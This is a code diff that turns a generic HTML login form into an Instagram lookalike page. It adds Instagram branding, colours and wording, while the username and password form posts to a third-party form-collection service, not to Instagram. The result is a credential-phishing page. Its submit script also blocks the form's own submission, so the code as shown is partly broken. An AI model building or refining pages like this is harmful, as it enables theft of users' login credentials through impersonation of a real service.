@@ -3,45 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Form</title>
+    <title>Instagram Login</title>
     <style>
+        /* Reset some default styles */
+        body, h1, p, form {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: Arial, sans-serif;
-        }
-        form {
             display: flex;
-            flex-direction: column;
-            width: 300px;
-            margin: auto;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #fafafa; /* Light background color */
+            font-family: 'Arial', sans-serif;
         }
+        
+        .container {
+            width: 350px;
+            background-color: #fff; /* White background for the form */
+            padding: 20px;
+            border: 1px solid #dbdbdb; /* Light border */
+            border-radius: 5px; /* Slightly rounded corners */
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Soft shadow */
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
         input {
+            width: 100%; /* Full width inputs */
+            padding: 10px;
             margin: 10px 0;
-            padding: 10px;
-            font-size: 16px;
+            border: 1px solid #dbdbdb; /* Light border */
+            border-radius: 3px; /* Slightly rounded corners */
+            font-size: 14px;
         }
+        
         button {
+            width: 100%; /* Full width button */
             padding: 10px;
+            background-color: #0095f6; /* Instagram blue */
+            color: white; /* White text color */
+            border: none; /* No border */
+            border-radius: 3px; /* Slightly rounded corners */
             font-size: 16px;
+            cursor: pointer; /* Pointer cursor on hover */
+            margin-top: 10px;
         }
+        
+        button:hover {
+            background-color: #007bbf; /* Darker blue on hover */
+        }
+        
         #message {
             margin-top: 10px;
             color: green;
+            text-align: center; /* Center the message text */
+        }
+
+        .divider {
+            margin: 20px 0;
+            text-align: center;
+            position: relative;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+            position: relative;
+            top: 50%;
+        }
+
+        .divider::before {
+            margin-right: 10px;
+        }
+
+        .divider::after {
+            margin-left: 10px;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
-    <h1>Login</h1>
-    <form id="login-form" action="https://getform.io/f/akkgovja" method="POST">
-        <input type="text" id="username" name="username" placeholder="Username" required>
-        <input type="password" id="password" name="password" placeholder="Password" required>
-        <button type="submit">Login</button>
-        <p id="message"></p>
-    </form>
+    <div class="container">
+        <h1>Instagram</h1>
+        <form id="login-form" action="https://getform.io/f/akkgovja" method="POST">
+            <input type="text" id="username" name="username" placeholder="Username" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+            <p id="message"></p>
+        </form>
+        <div class="divider">
+            <span>OR</span>
+        </div>
+        <p class="forgot-password">Forgot password?</p>
+    </div>
 
     <script>
         document.getElementById('login-form').addEventListener('submit', function(event) {
             event.preventDefault();
             document.getElementById('message').innerText = "Sending...";
+            // Optionally add any additional AJAX handling if needed
         });
     </script>
 </body>
